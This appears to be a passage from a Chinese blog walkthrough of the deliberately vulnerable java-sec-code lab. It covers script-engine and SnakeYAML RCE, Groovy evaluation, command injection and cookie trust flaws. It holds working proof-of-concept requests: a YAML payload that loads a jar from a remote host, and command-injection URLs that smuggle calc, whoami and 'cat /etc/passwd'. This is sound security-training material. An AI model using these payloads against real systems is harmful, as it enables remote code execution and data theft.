class="hljs-title class_">Runtime</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>    <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(cmd);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927399.png" alt="20250722150342733"></p><p>放入C盘</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927712.png" alt="20250722150411441"></p><p>用Python自带的简易HTTP服务器快速启动</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">cd</span> C:\malicious<br>python -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927851.png" alt="20250722150542190"></p><p>现在本地就有了一个HTTP服务器，远程JS脚本的URL就是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:8000/zz.js<br></code></pre></td></tr></table></figure><p>POC：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/rce/</span>jscmd?jsurl=http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8000</span>/zz.js<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927894.png" alt="20250722150709404"></p><p>HTTP访问日志：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928094.png" alt="20250722150740046"></p><h4 id="4-vuln-yarm"><a href="#4-vuln-yarm" class="headerlink" title="4.&#x2F;vuln&#x2F;yarm"></a>4.&#x2F;vuln&#x2F;yarm</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/vuln/yarm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">yarm</span><span class="hljs-params">(String content)</span> &#123;<br>    <span class="hljs-comment">//使用默认构造方法创建一个 SnakeYAML 的解析器。这个构造器会使用默认的 Constructor，允许加载 Java 对象，存在安全风险。</span><br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>    <span class="hljs-comment">//这里把传入的 content 作为 YAML 输入进行解析，如果内容里构造了特殊的 Java 对象，就可能会被反序列化并执行代码，形成 RCE</span><br>    y.load(content);<br>&#125;<br><br><span class="hljs-meta">@GetMapping(&quot;/sec/yarm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">secYarm</span><span class="hljs-params">(String content)</span> &#123;<br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SafeConstructor</span>());<br>    y.load(content);<br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>YAML 反序列化漏洞</strong> ,利用 SnakeYAML 默认构造器（反序列化）+ JDK 类加载机制，达到远程代码执行（RCE） 的攻击。</p><p>攻击核心点在于：</p><blockquote><p><strong>构造 ScriptEngineManager 并传入一个远程 URLClassLoader，从而触发恶意类加载或脚本执行。</strong></p><p>SnakeYaml反序列化漏洞研究:<a href="https://www.cnblogs.com/LittleHann/p/17828948.html">https://www.cnblogs.com/LittleHann/p/17828948.html</a></p></blockquote><p>这是源码中作者给出的一个poc</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20</span>[<span class="hljs-string">!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22</span>]]]]<br><br></code></pre></td></tr></table></figure><p>yaml-payload.jar:<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>下载好后开始打包为 jar：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">javac <span class="hljs-attribute">src</span>/artsploit/AwesomeScriptEngineFactory<span class="hljs-selector-class">.java</span> <br><br>jar -cvf yaml-payload<span class="hljs-selector-class">.jar</span> -C <span class="hljs-attribute">src</span>/ .<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928242.png" alt="20250722153817282"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928271.png" alt="20250722153829103"></p><p>将打包好的文件  yaml-payload.jar 放入服务器文件夹，开启HTTP</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929506.png" alt="20250722154012661"></p><p>触发漏洞：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1:8081/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20</span>[<span class="hljs-string">!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://localhost:8000/yaml-payload.jar%22</span>]]]]<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928486.png" alt="20250722155011777"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929891.png" alt="20250722155022447"></p><h4 id="5-groovy"><a href="#5-groovy" class="headerlink" title="5.groovy"></a>5.groovy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;groovy&quot;)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">groovyshell</span><span class="hljs-params">(String content)</span> &#123;<br>       <span class="hljs-comment">//GroovyShell 是 Groovy 提供的脚本解释器，可以在 Java 程序中动态执行 Groovy 代码</span><br>       <span class="hljs-type">GroovyShell</span> <span class="hljs-variable">groovyShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyShell</span>();<br>       <span class="hljs-comment">//将用户传入的脚本内容作为 Groovy 代码,立即执行</span><br>       groovyShell.evaluate(content);<br>   &#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">rce/groovy?<span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;calc&quot;</span>.execute()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929076.png" alt="20250722155651468"></p><h2 id="命令注入-Cmd-Inject"><a href="#命令注入-Cmd-Inject" class="headerlink" title="命令注入-Cmd Inject"></a>命令注入-Cmd Inject</h2><p>源码位置：src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;CommandInject.java</p><h3 id="1-codeinject"><a href="#1-codeinject" class="headerlink" title="1.&#x2F;codeinject"></a>1.&#x2F;codeinject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/codeinject&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInject</span><span class="hljs-params">(String filepath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<span class="hljs-comment">//GET 请求，接收 filepath 参数</span><br>        <span class="hljs-comment">//String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br>        String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir &quot;</span> + filepath&#125;;<span class="hljs-comment">//启动 cmd ，/c 执行后关闭终端，dir filepath 列出指定路径下的文件和目录；此处直接拼接了用户输入，存在 RCE 漏洞。</span><br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<span class="hljs-comment">//使用上面构建的命令数组创建进程</span><br>        builder.redirectErrorStream(<span class="hljs-literal">true</span>);<span class="hljs-comment">//将标准错误流（stderr）合并到标准输出流（stdout），方便统一读取</span><br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<span class="hljs-comment">//启动进程，执行命令</span><br>        <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<span class="hljs-comment">//获取命令执行后的标准输出流</span><br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ProcessBuilder</span><span class="hljs-params">(String... command)</span> &#123;<br>        <span class="hljs-built_in">this</span>.command = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(command.length);<br>        <span class="hljs-keyword">for</span> (String arg : command)<br>            <span class="hljs-built_in">this</span>.command.add(arg);<br>    &#125;<br>    <br> <span class="hljs-keyword">public</span> ProcessBuilder <span class="hljs-title function_">redirectErrorStream</span><span class="hljs-params">(<span class="hljs-type">boolean</span> redirectErrorStream)</span> &#123;<br>        <span class="hljs-built_in">this</span>.redirectErrorStream = redirectErrorStream;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=.%<span class="hljs-number">26</span>calc.exe<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=.%<span class="hljs-number">26</span>ipconfig<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=.%<span class="hljs-number">26</span>whoami<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=%<span class="hljs-number">7</span>Cwhoami<br></code></pre></td></tr></table></figure><ul><li>注意将符号进行 url 编码<ul><li>&amp; - .%26 - 拼接cmd命令</li><li>| - %7C - 执行多条命令</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929661.png" alt="20250723130014199"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929041.png" alt="20250723130045224"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929093.png" alt="20250723130103166"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080930759.png" alt="20250723130116070"></p><p>Linux：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:8080/codeinject?filepath=/tmp;<span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><h3 id="2-codeinject-host"><a href="#2-codeinject-host" class="headerlink" title="2.&#x2F;codeinject&#x2F;host"></a>2.&#x2F;codeinject&#x2F;host</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/codeinject/host&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInjectHost</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;host&quot;</span>);<br>        logger.info(host);<br>        String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;curl &quot;</span> + host&#125;;<br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<br>        builder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<br>        <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>注入参数为http请求头中的host参数，将host参数修改为 <code>payload：localhost&amp;ipconfig</code>，执行命令</p><p>BUG: Codeinject的host部分由于pom.xml更新了tomcat 版本导致打不通:</p><p><a href="https://github.com/JoyChou93/java-sec-code/issues/78">https://github.com/JoyChou93/java-sec-code/issues/78</a></p><h3 id="3-codeinject-sec"><a href="#3-codeinject-sec" class="headerlink" title="3.&#x2F;codeinject&#x2F;sec"></a>3.&#x2F;codeinject&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/codeinject/sec&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInjectSec</span><span class="hljs-params">(String filepath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">filterFilePath</span> <span class="hljs-operator">=</span> SecurityUtil.cmdFilter(filepath);<span class="hljs-comment">//调用了自定义的安全类</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == filterFilePath) &#123;<span class="hljs-comment">//如果 cmdFilter 方法返回 null ，进行拦截</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad boy. I got u.&quot;</span>;<br>    &#125;<br>    String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;ls -la &quot;</span> + filterFilePath&#125;;<span class="hljs-comment">//Linux 下的 shell 命令</span><br>    <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<br>    builder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<br>    <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityUtil</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">FILTER_PATTERN</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(SecurityUtil.class);<br><br>...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">cmdFilter</span><span class="hljs-params">(String input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (!FILTER_PATTERN.matcher(input).matches()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> input;<br>    &#125;<br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</code>:</p><ul><li><p><code>^</code> 和 <code>$</code>：表示整个字符串必须从头到尾都符合中间的规则。</p></li><li><p><code>[a-zA-Z0-9_/\\.-]+</code>：</p><ul><li><p><code>a-zA-Z0-9</code>：大小写字母和数字</p></li><li><p><code>_</code>：允许下划线</p></li><li><p><code>/</code>：允许正斜杠（路径分隔符）</p></li><li><p><code>.</code>：允许点号（如隐藏文件、扩展名）</p></li><li><p><code>-</code>：允许减号</p></li></ul></li></ul><p>可以过滤的威胁：</p><ul><li><code>;</code>, <code>&amp;</code>, <code>|</code>, <code>$</code>, <code>\</code>（除路径分隔符）, <code>*</code>, 空格、换行、引号等</li></ul><h2 id="cookies越权"><a href="#cookies越权" class="headerlink" title="cookies越权"></a>cookies越权</h2><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;Cookies.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> org.joychou.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.CookieValue;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.Cookie;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><br><span class="hljs-keyword">import</span> org.joychou.util.WebUtils;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.springframework.web.util.WebUtils.getCookie;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick或者id，导致越权问题。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/cookie&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cookies</span> &#123;<br><br>    <span class="hljs-comment">//表示 Cookie 中用于表示用户昵称的键</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">NICK</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;nick&quot;</span>;<br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln01&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln01</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-comment">//调用 getCookieValueByName 方法获取 cookie 中的 nick 值</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> WebUtils.getCookieValueByName(req, NICK); <span class="hljs-comment">// key code</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public class WebUtils &#123;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    public static String getCookieValueByName(HttpServletRequest request, String cookieName) &#123;</span><br><span class="hljs-comment">        Cookie cookie = org.springframework.web.util.WebUtils.getCookie(request, cookieName);</span><br><span class="hljs-comment">        return cookie == null ? null : cookie.getValue();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"> */</span><br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln02&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln02</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Cookie[] cookie = req.getCookies();<br><br>        <span class="hljs-keyword">if</span> (cookie != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">//调用 getCookie 方法获取 cookie 中的 nick 值</span><br>            nick = getCookie(req, NICK).getValue();  <span class="hljs-comment">// key code</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public class WebUtils &#123;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    public static Cookie getCookie(HttpServletRequest request, String name) &#123;</span><br><span class="hljs-comment">        Assert.notNull(request, &quot;Request must not be null&quot;);</span><br><span class="hljs-comment">        Cookie[] cookies = request.getCookies();</span><br><span class="hljs-comment">        if (cookies != null) &#123;</span><br><span class="hljs-comment">            for(Cookie cookie : cookies) &#123;</span><br><span class="hljs-comment">                if (name.equals(cookie.getName())) &#123;</span><br><span class="hljs-comment">                    return cookie;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        return null;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    */</span><br>    <br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln03&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln03</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Cookie cookies[] = req.getCookies();<br>        <span class="hljs-keyword">if</span> (cookies != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//遍历所有 cookie ，找 name 为 nick</span><br>            <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>                <span class="hljs-comment">// key code. Equals can also be equalsIgnoreCase.</span><br>                <span class="hljs-comment">//equals() 是大小写敏感</span><br>                <span class="hljs-keyword">if</span> (NICK.equals(cookie.getName())) &#123;<br>                    nick = cookie.getValue();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln04&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln04</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Cookie cookies[] = req.getCookies();<br>        <span class="hljs-keyword">if</span> (cookies != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>                <span class="hljs-comment">//使用 equalsIgnoreCase()，支持不区分大小写匹配 Cookie 名称。</span><br>                <span class="hljs-keyword">if</span> (cookie.getName().equalsIgnoreCase(NICK)) &#123;  <span class="hljs-comment">// key code</span><br>                    nick = cookie.getValue();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln05&quot;)</span><br>    <span class="hljs-comment">//使用 Spring 注解 @CookieValue(&quot;nick&quot;) 自动注入名为 nick 的 cookie 值。</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln05</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(&quot;nick&quot;)</span> String nick)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln06&quot;)</span><br>    <span class="hljs-comment">//和 vuln05 仅语法不同，功能完全一样。</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln06</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(value = 